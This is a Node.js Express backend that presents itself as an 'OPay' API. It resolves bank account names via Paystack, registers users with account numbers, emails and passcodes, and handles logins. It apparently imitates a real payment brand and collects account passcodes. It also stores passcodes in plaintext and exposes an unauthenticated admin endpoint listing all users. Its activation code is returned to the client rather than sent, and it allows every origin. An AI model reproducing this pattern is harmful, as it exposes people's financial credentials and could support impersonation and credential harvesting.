const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { createClient } = require('@supabase/supabase-js');

dotenv.config();

const app = express();

// ============ CORS CONFIGURATION - Allow all origins ============
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

// ============ INITIALIZE SUPABASE ============
const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SERVICE_KEY
);

const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;

console.log('✅ Server starting...');
console.log(`Supabase URL: ${process.env.SUPABASE_URL ? '✅' : '❌'}`);
console.log(`Paystack Key: ${PAYSTACK_SECRET_KEY ? '✅' : '❌'}`);

// ============ HEALTH CHECK ============
app.get('/', (req, res) => {
    res.json({ 
        message: 'OPay Backend API is running!',
        status: 'ok',
        endpoints: ['/api/resolve-account', '/api/check-email', '/api/send-activation', '/api/verify-and-create', '/api/login']
    });
});

// ============ RESOLVE ACCOUNT NAME ============
app.post('/api/resolve-account', async (req, res) => {
    console.log('📞 Resolve account request:', req.body);
    const { account_number } = req.body;
    
    try {
        const response = await fetch(`https://api.paystack.co/bank/resolve?account_number=${account_number}&bank_code=999992`, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
                'Content-Type': 'application/json'
            }
        });
        
        const data = await response.json();
        console.log('Paystack response:', data.status ? 'Success' : 'Failed');
        
        if (data.status) {
            res.json({
                success: true,
                account_name: data.data.account_name,
                account_number: data.data.account_number
            });
        } else {
            res.json({
                success: false,
                message: data.message || 'Account not found'
            });
        }
    } catch (error) {
        console.error('Error:', error.message);
        res.json({ success: false, message: 'Network error' });
    }
});

// ============ CHECK EMAIL ============
app.post('/api/check-email', async (req, res) => {
    console.log('📧 Check email:', req.body.email);
    const { email } = req.body;
    
    try {
        const { data } = await supabase
            .from('users')
            .select('email')
            .eq('email', email)
            .maybeSingle();
        
        res.json({ available: !data });
    } catch (error) {
        res.json({ available: true });
    }
});

// ============ SEND ACTIVATION CODE ============
app.post('/api/send-activation', async (req, res) => {
    console.log('📨 Send activation:', req.body.email);
    const { email, accountNumber, accountName } = req.body;
    const activationCode = Math.floor(10000 + Math.random() * 90000).toString();
    
    console.log(`📧 ACTIVATION CODE for ${email}: ${activationCode}`);
    
    res.json({ 
        success: true, 
        message: 'Activation code sent',
        code: activationCode
    });
});

// ============ VERIFY & CREATE USER ============
app.post('/api/verify-and-create', async (req, res) => {
    console.log('🔐 Verify and create:', req.body.email);
    const { account_number, account_name, email, password_code, activation_code } = req.body;
    
    if (!activation_code || activation_code.length !== 5) {
        return res.json({ success: false, message: 'Invalid activation code' });
    }
    
    try {
        // Check if account exists
        const { data: existingAccount } = await supabase
            .from('users')
            .select('account_number')
            .eq('account_number', account_number)
            .maybeSingle();
        
        if (existingAccount) {
            return res.json({ success: false, message: 'Account number already registered' });
        }
        
        // Check if email exists
        const { data: existingEmail } = await supabase
            .from('users')
            .select('email')
            .eq('email', email)
            .maybeSingle();
        
        if (existingEmail) {
            return res.json({ success: false, message: 'Email already registered' });
        }
        
        // Create user
        const { error } = await supabase
            .from('users')
            .insert({
                account_number,
                account_name,
                email,
                password_code,
                platform: 'opay',
                is_active: true,
                email_verified: true
            });
        
        if (error) throw error;
        
        console.log('✅ User created:', account_number);
        
        res.json({ 
            success: true, 
            message: 'Account created!',
            user: { account_number, account_name, email }
        });
    } catch (error) {
        console.error('Error:', error.message);
        res.json({ success: false, message: error.message });
    }
});

// ============ LOGIN ============
app.post('/api/login', async (req, res) => {
    console.log('🔑 Login request:', req.body.account_number);
    const { account_number, password_code } = req.body;
    
    try {
        const { data } = await supabase
            .from('users')
            .select('account_number, account_name, email')
            .eq('account_number', account_number)
            .eq('password_code', password_code)
            .maybeSingle();
        
        if (data) {
            res.json({ success: true, user: data });
        } else {
            res.json({ success: false, message: 'Invalid credentials' });
        }
    } catch (error) {
        res.json({ success: false, message: 'Database error' });
    }
});

// ============ ADMIN - GET ALL USERS ============
app.get('/api/admin/users', async (req, res) => {
    const { data } = await supabase
        .from('users')
        .select('id, account_number, account_name, email, created_at');
    
    res.json({ users: data || [] });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ CORS enabled for all origins`);
});
